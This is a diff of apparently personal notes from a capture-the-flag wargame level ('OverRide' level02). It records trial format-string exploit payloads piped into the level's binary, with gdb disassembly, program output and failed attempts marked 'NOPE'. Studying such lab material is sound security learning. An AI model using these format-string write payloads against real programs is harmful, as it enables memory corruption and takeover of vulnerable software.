@@ -370,6 +370,35 @@ $4 = {<text variable, no debug info>} 0x400710 <exit@plt>
 
 python -c "'\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" 
 
-python -c "'\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" | ./level2
+python -c "'\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" | ./level02
 
 NOPE
+
+python -c "print '\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" 
+
+python -c "print '\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" | ./level02
+
+level02@OverRide:~$ python -c "print '\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+�@ does not have access!
+
+
+
+0x400710 -> \x10\x07\x40\x00
+
+python -c "print '\x10\x07\x40\x00' + '%4196998x' + '%28\$n'" 
+
+python -c "print '\x10\x07\x40\x00' + '%4196998x' + '%28\$n'" | ./level02
+
+NOPE
+
+  0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
+   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>
+
+0x400d3a -> anything => check si peut modifier value avec %x + %\$n
+
+0x400d3a -> \x3a\x0d\x40\x00
